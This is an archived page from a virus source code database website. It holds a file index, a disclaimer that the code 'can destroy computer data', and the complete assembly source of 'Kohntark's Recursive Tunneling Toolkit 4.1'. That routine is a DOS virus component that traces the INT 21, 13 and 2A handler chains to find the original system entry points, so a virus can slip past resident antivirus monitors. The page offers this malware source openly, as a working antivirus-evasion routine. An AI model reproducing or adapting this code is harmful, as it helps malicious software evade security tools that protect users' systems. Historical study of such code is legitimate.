<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: krtt41_asm</title>
<meta name="KEYWORDS" content="krtt41.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for krtt41.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="kali-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kali-4_asm.php">kali-4_asm</a><br>
<a href="kaoshide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kaoshide_asm.php">kaoshide_asm</a><br>
<a href="k_cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k_cmos_asm.php">k_cmos_asm</a><br>
<a href="k-cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k-cmos_asm.php">k-cmos_asm</a><br>
<a href="keepacid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepacid_asm.php">keepacid_asm</a><br>
<a href="keepenem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepenem_asm.php">keepenem_asm</a><br>
<a href="keykap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykap_asm.php">keykap_asm</a><br>
<a href="keykapt2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykapt2_asm.php">keykapt2_asm</a><br>
<a href="keypress_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keypress_asm.php">keypress_asm</a><br>
<a href="kiis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kiis_asm.php">kiis_asm</a><br>
<a href="kildia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kildia_asm.php">kildia_asm</a><br>
<a href="kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_asm.php">kill_asm</a><br>
<a href="kill_br_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_br_asm.php">kill_br_asm</a><br>
<a href="kill_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_rep_asm.php">kill_rep_asm</a><br>
<a href="kinison__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison__asm.php">kinison__asm</a><br>
<a href="kinison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison_asm.php">kinison_asm</a><br>
<a href="kinniso__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinniso__asm.php">kinniso__asm</a><br>
<a href="kinnison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinnison_asm.php">kinnison_asm</a><br>
<a href="kinsn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinsn_asm.php">kinsn_asm</a><br>
<a href="kk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kk2_asm.php">kk2_asm</a><br>
<a href="kod4_129_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_129_asm.php">kod4_129_asm</a><br>
<a href="kod4_399_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_399_asm.php">kod4_399_asm</a><br>
<a href="kode4-1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-1__asm.php">kode4-1__asm</a><br>
<a href="kode4-2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-2__asm.php">kode4-2__asm</a><br>
<a href="kohn_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_6_asm.php">kohn_6_asm</a><br>
<a href="kohn_9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_9_asm.php">kohn_9_asm</a><br>
<a href="kompanio_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kompanio_asm.php">kompanio_asm</a><br>
<a href="krad_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krad_pas.php">krad_pas</a><br>
<a href="krtt41_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krtt41_asm.php">krtt41_asm</a><br>
<a href="krttdemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krttdemo_asm.php">krttdemo_asm</a><br>
<a href="kstest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kstest_asm.php">kstest_asm</a><br>
<a href="ksvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/ksvir_asm.php">ksvir_asm</a><br>
<a href="kuku_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kuku_bas.php">kuku_bas</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; KOHNTARK'S RECURSIVE TUNNELING TOOLKIT 4.1 (KRTT 4.1)
; KEEP THIS IN MIND WHEN LOOKING AT THE CODE:
; 	JMP ????:????		==>		EA????????
;	CALL ????:????		==>		9A????????
;	JMP FAR [????]		==>		FF2E????
;	CALL FAR [????]		==>		FF1E????
; AND ALSO:
;	JMP ????		==>		FF26????
;	CALL ????		==>		E8????

code		segment word public
	assume cs:code, ds:code, es:code, ss:code
public Tunnel
Tunnel		label		byte
	CLI
	XOR	AX,AX			; Get Segment Zero ==> ES
	MOV	ES,AX
	XOR	DI,DI
	MOV	DX,ES:[0AEH]		; Get Int 2B Segment Addr
	MOV	CX,ES:[0A2H]		; Get Int 28 Segment Addr
	CMP	DX,CX			; Are They Equal?
	JZ	Proceed			; If So, Go On
	MOV	CX,ES:[0B2H]		; Get Int 2C Segment Addr
	CMP	DX,CX			; Equal or Not?
	JZ	Proceed			; Of So Go On
	MOV	AH,3			; Internal DOS interrupts are
	RET					; Hooked (Int 2b, 28, 2c)

Proceed:
	CMP	BP,1			; Check Int 2A?
	JZ	CheckInt2A
	CMP	BP,2			; Check Int 13?
	JZ	CheckInt13

	MOV	BX,ES:[84H]		; Check Int 21
	MOV	ES,ES:[86H]      	; Get Int 21 Far Addres
	JMP	CheckInt21

CheckInt13:
	MOV	BX,ES:[4CH]		; Get Int 13 Far Address
	MOV	ES,ES:[4EH]
	MOV	BP,ES
	MOV	DX,70H			; Is Segment = 0070?
	CMP	BP,DX
	JZ	NotHooked		; If it is: Int not hooked
	JMP	Hooked			; If Not, Continue

CheckInt2A:
	MOV	BX,ES:[0A8H]		; Get Int 2A Far Address
	MOV	ES,ES:[0AAH]

CheckInt21:
	MOV	BP,ES			; Compare Segment of Int 21/2A
	CMP	DX,BP			; with segment of Int 28
	JNZ	Hooked

NotHooked:
	XCHG	BX,DI			; BX = 0
	MOV	AH,2			; They're equal: 
	RET				; Int Not hooked!

Hooked:
	CALL	DoTunneling
	STI
	RET

DoTunneling:
; NOTE THAT:
;	ADDRESSES OF CODE TO TUNNEL (INT 21, 13, 2A) ARE PASSED IN ES:BX
;	DX HOLDS SEGMENT ADDRESS OF INTERNAL INT 2A OR BIOS SEGMENT 70H
;	AH HOLDS RESULTS, AL RECURSION DEPTH
	PUSH	ES
	PUSH	BX
	CMP	AL,7			; if recursion depth 7
	JZ	ExitTun			; exit
	CMP	AH,1			; if found
	JZ	ExitTun			; exit

	INC	AL			; increase recursion depth
	MOV	CX,0FFFAH		; 
	SUB	CX,BX			; 

continue:
	PUSH	BX

	CMP	BYTE PTR ES:[BX],0E8H	; call xxxx?
	JZ	icall
	CMP	BYTE PTR ES:[BX],0EAH	; jmp xxxx:xxxx?
	JZ	immfound
	CMP	BYTE PTR ES:[BX],9AH	; call xxxx:xxxx?
	JZ	immfound
	CMP	BYTE PTR ES:[BX],2EH	; cs:?
	JNZ	nothingf

indirect_jmp_or_call:
	CMP	BYTE PTR ES:[BX+1],0FFH
	JNZ	nothingf
	CMP	BYTE PTR ES:[BX+2],1EH	; call far [xxxx]
	JZ	indfound
	CMP	BYTE PTR ES:[BX+2],2EH	; jmp far [xxxx]
	JNZ	nothingf

indfound:				; indirect (call far [x], jmp far [x])
	MOV	BP,ES:[BX+3]		; get addr of variable
	DEC	BP
	XCHG	BX,BP
	JMP	immfound		; and go get its contents

nothingf:
	POP	BX
	CMP	AH,1
	JZ	ExitTun
	CMP	AL,7
	JZ	ExitTun
	INC	BX
	LOOP	continue

icall:
	POP	BX			; its a call near
	ADD	BX,3			; continue
	LOOP	continue

ExitTun:
	POP	BX
	POP	ES
	RET

immfound:
	POP	BP			; get addr of instruccion
	ADD	BP,4			; save addres for next instruccion
	PUSH	BP			; see if segment of jmp is equal to
	CMP	ES:[BX+3],DX		; desired segment.
	JZ	found			; if it is, exit
	CMP	WORD PTR ES:[BX+3],0	; see if its zero.
	JZ	nothingf
	PUSH	ES
	POP	BP
	CMP	ES:[BX+3],BP		; see if it is within current seg.
	JZ	nothingf
; if none of the precedent, then its a non-int21, far call or jmp
	MOV	BP,BX
	MOV	BX,ES:[BX+1]		; get offset
	MOV	ES,ES:[BP+3]		; get segment
	CALL	DoTunneling 		; and call recursively

	JMP	nothingf

found:
	MOV	DI,ES:[BX+01]		; get the offset of int
	MOV	AH,1			; return with succes
	JMP	nothingf
ends
end
</textarea></td></tr></table></body></html>
